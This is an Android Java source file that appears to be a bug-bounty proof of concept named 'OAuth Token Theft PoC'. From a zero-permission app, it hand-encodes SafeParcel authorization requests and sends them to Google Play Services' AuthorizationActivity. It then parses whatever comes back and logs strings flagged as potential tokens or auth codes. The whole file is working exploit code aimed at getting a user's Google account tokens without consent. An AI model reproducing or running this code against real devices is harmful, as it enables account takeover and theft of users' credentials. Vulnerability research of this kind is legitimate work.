package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class OAuthStealActivity extends Activity {
    private static final String T = "OAUTHSTEAL";
    private static final int RC_AUTH = 3001;
    private static final int RC_VERIFY = 3002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(T, "=== OAuth Token Theft PoC ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());

        String mode = getIntent().getStringExtra("mode");
        if ("verify".equals(mode)) {
            testVerifyWithGoogle();
        } else {
            testAuthorizationRequest();
        }
    }

    private void testAuthorizationRequest() {
        Log.w(T, "--- Testing AuthorizationActivity with proper SafeParcel ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.authorization.ui.AuthorizationActivity"));

            byte[] authRequest = buildAuthorizationRequest(
                new String[]{"email", "profile", "openid"},
                null,
                true,
                true
            );
            intent.putExtra("authorization_request", authRequest);
            intent.putExtra("session_id", "vrp_oauth_" + System.currentTimeMillis());

            Log.w(T, "AuthorizationRequest bytes length=" + authRequest.length);
            dumpHex("AuthReq", authRequest);

            startActivityForResult(intent, RC_AUTH);
        } catch (Exception e) {
            Log.e(T, "AuthorizationRequest failed: " + e.getMessage(), e);
        }
    }

    private void testVerifyWithGoogle() {
        Log.w(T, "--- Testing with VerifyWithGoogleRequest ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.authorization.ui.AuthorizationActivity"));

            byte[] verifyRequest = buildVerifyWithGoogleRequest(
                new String[]{"email", "profile"},
                null,
                false,
                "vrp_nonce_" + System.currentTimeMillis()
            );
            intent.putExtra("verify_with_google_request", verifyRequest);
            intent.putExtra("session_id", "vrp_verify_" + System.currentTimeMillis());

            Log.w(T, "VerifyWithGoogleRequest bytes length=" + verifyRequest.length);
            startActivityForResult(intent, RC_VERIFY);
        } catch (Exception e) {
            Log.e(T, "VerifyWithGoogleRequest failed: " + e.getMessage(), e);
        }
    }

    private void writeScopeToParcel(Parcel p, String scopeUri) {
        p.writeInt(0xFFFF4F45);
        int sizePos = p.dataPosition();
        p.writeInt(0);
        int startPos = p.dataPosition();

        p.writeInt((4 << 16) | 1);
        p.writeInt(1);

        p.writeInt((0xFFFF << 16) | 2);
        int strSizePos = p.dataPosition();
        p.writeInt(0);
        int strStart = p.dataPosition();
        p.writeString(scopeUri);
        int strEnd = p.dataPosition();
        p.setDataPosition(strSizePos);
        p.writeInt(strEnd - strStart);
        p.setDataPosition(strEnd);

        int endPos = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(endPos - startPos);
        p.setDataPosition(endPos);
    }

    private void writeScopeList(Parcel p, int fieldId, String[] scopes) {
        p.writeInt((0xFFFF << 16) | fieldId);
        int fieldSizePos = p.dataPosition();
        p.writeInt(0);
        int fieldStart = p.dataPosition();

        p.writeInt(scopes.length);
        for (String scope : scopes) {
            p.writeInt(1);
            writeScopeToParcel(p, scope);
        }

        int fieldEnd = p.dataPosition();
        p.setDataPosition(fieldSizePos);
        p.writeInt(fieldEnd - fieldStart);
        p.setDataPosition(fieldEnd);
    }

    private void writeStringField(Parcel p, int fieldId, String value) {
        if (value == null) return;
        p.writeInt((0xFFFF << 16) | fieldId);
        int sizePos = p.dataPosition();
        p.writeInt(0);
        int start = p.dataPosition();
        p.writeString(value);
        int end = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(end - start);
        p.setDataPosition(end);
    }

    private void writeBoolField(Parcel p, int fieldId, boolean value) {
        p.writeInt((4 << 16) | fieldId);
        p.writeInt(value ? 1 : 0);
    }

    private void writeIntField(Parcel p, int fieldId, int value) {
        p.writeInt((4 << 16) | fieldId);
        p.writeInt(value);
    }

    private byte[] buildAuthorizationRequest(String[] scopes, String serverClientId,
            boolean requestAuthCode, boolean requestIdToken) {
        Parcel p = Parcel.obtain();

        p.writeInt(0xFFFF4F45);
        int totalSizePos = p.dataPosition();
        p.writeInt(0);
        int dataStart = p.dataPosition();

        writeScopeList(p, 1, scopes);

        if (serverClientId != null) {
            writeStringField(p, 2, serverClientId);
        }

        writeBoolField(p, 3, requestAuthCode);
        writeBoolField(p, 4, requestIdToken);

        writeStringField(p, 6, "vrp_nonce_" + System.currentTimeMillis());
        writeStringField(p, 7, "vrp_session_" + System.currentTimeMillis());

        writeBoolField(p, 8, false);
        writeBoolField(p, 10, true);
        writeIntField(p, 11, 0);

        int dataEnd = p.dataPosition();
        p.setDataPosition(totalSizePos);
        p.writeInt(dataEnd - dataStart);
        p.setDataPosition(dataEnd);

        byte[] bytes = p.marshall();
        p.recycle();
        return bytes;
    }

    private byte[] buildVerifyWithGoogleRequest(String[] scopes, String serverClientId,
            boolean requestOfflineAccess, String nonce) {
        Parcel p = Parcel.obtain();

        p.writeInt(0xFFFF4F45);
        int totalSizePos = p.dataPosition();
        p.writeInt(0);
        int dataStart = p.dataPosition();

        writeScopeList(p, 1, scopes);

        if (serverClientId != null) {
            writeStringField(p, 2, serverClientId);
        }

        writeBoolField(p, 3, requestOfflineAccess);

        if (nonce != null) {
            writeStringField(p, 4, nonce);
        }

        int dataEnd = p.dataPosition();
        p.setDataPosition(totalSizePos);
        p.writeInt(dataEnd - dataStart);
        p.setDataPosition(dataEnd);

        byte[] bytes = p.marshall();
        p.recycle();
        return bytes;
    }

    private void dumpHex(String label, byte[] data) {
        StringBuilder hex = new StringBuilder();
        for (int i = 0; i < Math.min(data.length, 128); i++) {
            hex.append(String.format("%02x", data[i]));
            if ((i + 1) % 4 == 0) hex.append(" ");
        }
        Log.w(T, label + " HEX: " + hex.toString());
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        String target = requestCode == RC_AUTH ? "AuthorizationRequest" : "VerifyWithGoogle";

        Log.w(T, "=== RESULT FROM " + target + " ===");
        Log.w(T, "resultCode=" + resultCode + " (OK=" + RESULT_OK + " CANCEL=" + RESULT_CANCELED + ")");

        if (data != null) {
            Log.w(T, "*** DATA RETURNED ***");
            Bundle extras = data.getExtras();
            if (extras != null) {
                Log.w(T, "*** EXTRAS (count=" + extras.size() + ") ***");
                for (String key : extras.keySet()) {
                    Object val = extras.get(key);
                    if (val == null) continue;
                    Log.w(T, "  KEY=" + key + " TYPE=" + val.getClass().getName());

                    if (val instanceof byte[]) {
                        byte[] bytes = (byte[]) val;
                        Log.w(T, "  BYTES_LEN=" + bytes.length);
                        dumpHex("  " + key, bytes);
                        parseStatusFromBytes(bytes);
                        parseAuthResultFromBytes(bytes);
                    } else {
                        String valStr = val.toString();
                        Log.w(T, "  VALUE=" + valStr.substring(0, Math.min(500, valStr.length())));
                    }
                }
            }
        } else {
            Log.w(T, "No data returned");
        }

        if (requestCode == RC_AUTH) {
            testVerifyWithGoogle();
        } else {
            Log.w(T, "=== ALL OAUTH TESTS COMPLETE ===");
        }
    }

    private void parseStatusFromBytes(byte[] bytes) {
        try {
            Parcel p = Parcel.obtain();
            p.unmarshall(bytes, 0, bytes.length);
            p.setDataPosition(0);

            int magic = p.readInt();
            if (magic != 0xFFFF4F45 && magic != -45243) {
                Log.w(T, "  Not SafeParcel (magic=0x" + Integer.toHexString(magic) + ")");
                p.recycle();
                return;
            }

            int totalSize = p.readInt();
            Log.w(T, "  SafeParcel totalSize=" + totalSize);

            while (p.dataPosition() < bytes.length) {
                int header = p.readInt();
                int fieldId = header & 0xFFFF;
                int dataSize = (header >> 16) & 0xFFFF;
                if (dataSize == 0xFFFF) {
                    dataSize = p.readInt();
                }
                int fieldStart = p.dataPosition();
                Log.w(T, "  Field " + fieldId + " size=" + dataSize);

                if (dataSize == 4) {
                    int intVal = p.readInt();
                    Log.w(T, "    INT=" + intVal);
                } else if (dataSize > 4) {
                    try {
                        String strVal = p.readString();
                        if (strVal != null && strVal.length() > 0 && strVal.length() < 1000) {
                            Log.w(T, "    STR=" + strVal);
                        }
                    } catch (Exception e) {
                        // not a string
                    }
                }
                p.setDataPosition(fieldStart + dataSize);
            }
            p.recycle();
        } catch (Exception e) {
            Log.w(T, "  Parse error: " + e.getMessage());
        }
    }

    private void parseAuthResultFromBytes(byte[] bytes) {
        try {
            Parcel p = Parcel.obtain();
            p.unmarshall(bytes, 0, bytes.length);
            p.setDataPosition(0);

            int magic = p.readInt();
            if (magic != 0xFFFF4F45 && magic != -45243) {
                p.recycle();
                return;
            }
            int totalSize = p.readInt();

            while (p.dataPosition() < bytes.length) {
                int header = p.readInt();
                int fieldId = header & 0xFFFF;
                int dataSize = (header >> 16) & 0xFFFF;
                if (dataSize == 0xFFFF) {
                    dataSize = p.readInt();
                }
                int fieldStart = p.dataPosition();

                if (dataSize > 4 && dataSize < 2000) {
                    try {
                        String s = p.readString();
                        if (s != null && s.length() > 10) {
                            Log.w(T, "  *** POTENTIAL TOKEN/CODE (field " + fieldId + "): " +
                                s.substring(0, Math.min(200, s.length())) + " ***");
                        }
                    } catch (Exception e) {}
                }
                p.setDataPosition(fieldStart + dataSize);
            }
            p.recycle();
        } catch (Exception e) {}
    }
}
